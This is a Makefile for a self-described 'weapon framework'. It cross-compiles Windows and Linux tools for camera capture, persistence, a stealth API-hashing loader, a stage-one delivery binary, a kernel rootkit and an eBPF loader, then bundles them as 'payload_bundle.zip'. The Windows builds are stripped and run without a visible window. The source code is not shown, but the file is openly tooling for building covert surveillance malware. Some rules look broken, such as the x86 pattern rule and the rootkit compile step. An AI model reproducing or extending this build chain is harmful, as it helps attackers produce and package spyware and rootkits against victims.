# Unified Makefile for v2 weapon framework
# Supports cross-compilation for Windows and Linux

# Compiler settings
CC_LINUX ?= gcc
CC_WIN64 ?= x86_64-w64-mingw32-gcc
CC_WIN32 ?= i686-w64-mingw32-gcc

# Build type
BUILD_TYPE ?= release
ifeq ($(BUILD_TYPE),release)
    CFLAGS = -O2 -Wall -s -DNDEBUG
    CFLAGS_WIN = -O2 -Wall -s -static -DNDEBUG
else
    CFLAGS = -O0 -g -Wall
    CFLAGS_WIN = -O0 -g -static
endif

# Directories
SRC_DIR = ..
BUILD_DIR = build
DIST_DIR = dist
PY_DIR = pyc

# Output directories
WIN64_OUT = $(DIST_DIR)/windows/x64
WIN32_OUT = $(DIST_DIR)/windows/x86
LINUX_OUT = $(DIST_DIR)/linux

# Windows x64 targets
WIN64_TARGETS = \
	$(WIN64_OUT)/camera_capture.exe \
	$(WIN64_OUT)/persistence.exe \
	$(WIN64_OUT)/stealth_loader.exe \
	$(WIN64_OUT)/stage1.exe

# Windows x32 targets
WIN32_TARGETS = \
	$(WIN32_OUT)/camera_capture.exe \
	$(WIN32_OUT)/persistence.exe

# Linux targets
LINUX_TARGETS = \
	$(LINUX_OUT)/camera_capture \
	$(LINUX_OUT)/persistence \
	$(LINUX_OUT)/rootkit.ko \
	$(LINUX_OUT)/ebpf_loader

# Source files
CAMERA_SRC = $(SRC_DIR)/05_persistence/windows_camera.c
PERSIST_SRC = $(SRC_DIR)/05_persistence/windows_persist.c
STEALTH_SRC = $(SRC_DIR)/11_stealth/api_hash.c
STAGE1_SRC = $(SRC_DIR)/09_delivery/stage1.c

LINUX_CAMERA_SRC = $(SRC_DIR)/05_persistence/linux_camera.c
LINUX_PERSIST_SRC = $(SRC_DIR)/05_persistence/linux_persist.c
ROOTKIT_SRC = $(SRC_DIR)/05_persistence/rootkit.c
EBPF_SRC = $(SRC_DIR)/05_persistence/ebpf_loader.c

.PHONY: all clean windows linux package pyc test help

all: help

help:
	@echo "Available targets:"
	@echo "  make windows    - Cross-compile all Windows targets (x64 + x86)"
	@echo "  make linux      - Compile all Linux targets"
	@echo "  make pyc        - Compile Python modules to bytecode"
	@echo "  make package    - Create distribution zip"
	@echo "  make test       - Run offline test suite"
	@echo "  make clean      - Remove all build artifacts"
	@echo "  make all        - Build everything"

# Create output directories
$(WIN64_OUT) $(WIN32_OUT) $(LINUX_OUT) $(PY_DIR):
	mkdir -p $@

# Windows x64 builds
$(WIN64_OUT)/camera_capture.exe: $(CAMERA_SRC) | $(WIN64_OUT)
	$(CC_WIN64) $(CFLAGS_WIN) -Wl,--subsystem,windows $< -o $@

$(WIN64_OUT)/persistence.exe: $(PERSIST_SRC) | $(WIN64_OUT)
	$(CC_WIN64) $(CFLAGS_WIN) -Wl,--subsystem,windows $< -o $@

$(WIN64_OUT)/stealth_loader.exe: $(STEALTH_SRC) | $(WIN64_OUT)
	$(CC_WIN64) $(CFLAGS_WIN) -Wl,--subsystem,windows $< -o $@

$(WIN64_OUT)/stage1.exe: $(STAGE1_SRC) | $(WIN64_OUT)
	$(CC_WIN64) $(CFLAGS_WIN) -Wl,--subsystem,windows $< -o $@

# Windows x86 builds
$(WIN32_OUT)/%.exe: %.c | $(WIN32_OUT)
	$(CC_WIN32) $(CFLAGS_WIN) -Wl,--subsystem,windows $< -o $@

# Linux builds
$(LINUX_OUT)/camera_capture: $(LINUX_CAMERA_SRC) | $(LINUX_OUT)
	$(CC_LINUX) $(CFLAGS) $< -o $@ -lv4l2

$(LINUX_OUT)/persistence: $(LINUX_PERSIST_SRC) | $(LINUX_OUT)
	$(CC_LINUX) $(CFLAGS) $< -o $@

$(LINUX_OUT)/rootkit.ko: $(ROOTKIT_SRC) | $(LINUX_OUT)
	$(CC_LINUX) $(CFLAGS) -D__KERNEL__ -DMODULE -c $< -o $@

$(LINUX_OUT)/ebpf_loader: $(EBPF_SRC) | $(LINUX_OUT)
	$(CC_LINUX) $(CFLAGS) $< -o $@ -lbpf -lelf

# Meta targets
windows: $(WIN64_TARGETS) $(WIN32_TARGETS)
	@echo "[+] Windows targets built"

linux: $(LINUX_TARGETS)
	@echo "[+] Linux targets built"

pyc:
	@mkdir -p $(PY_DIR)
	@find $(SRC_DIR) -name "*.py" -exec python3 -m py_compile {} \;
	@echo "[+] Python modules compiled"

package: windows linux pyc
	@cd $(DIST_DIR) && zip -r ../payload_bundle.zip .
	@echo "[+] Package created: payload_bundle.zip"

test:
	@python3 tests/run_tests.py
	@echo "[+] Tests completed"

clean:
	rm -rf $(DIST_DIR) $(PY_DIR)
	rm -f payload_bundle.zip
	find . -name "__pycache__" -type d -exec rm -rf {} +
	find . -name "*.pyc" -delete
	@echo "[+] Clean complete"

# Print build info
info:
	@echo "Build configuration:"
	@echo "  BUILD_TYPE: $(BUILD_TYPE)"
	@echo "  CC_LINUX:   $(CC_LINUX)"
	@echo "  CC_WIN64:   $(CC_WIN64)"
	@echo "  CC_WIN32:   $(CC_WIN32)"
	@echo "  CFLAGS:     $(CFLAGS)"
	@echo "  CFLAGS_WIN: $(CFLAGS_WIN)"
